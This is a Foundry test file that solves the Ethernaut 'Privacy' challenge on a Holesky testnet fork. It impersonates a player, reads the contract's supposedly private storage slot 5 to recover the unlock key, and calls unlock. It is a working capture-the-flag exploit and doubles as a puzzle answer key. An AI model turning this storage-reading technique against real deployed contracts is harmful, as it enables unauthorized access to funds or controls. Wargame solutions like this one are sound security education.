// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Privacy} from "../../src/Ethernaut/Privacy.sol";

contract VaultAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        Privacy privacy = Privacy(0x79E8c1C09730ea7aAC015f1dd6bE185008d9718F);
        bytes32 password = vm.load(
            0x79E8c1C09730ea7aAC015f1dd6bE185008d9718F,
            bytes32(uint256(5))
        );
        privacy.unlock(bytes16(password));
        vm.stopPrank();
        assertFalse(privacy.locked());
    }
}
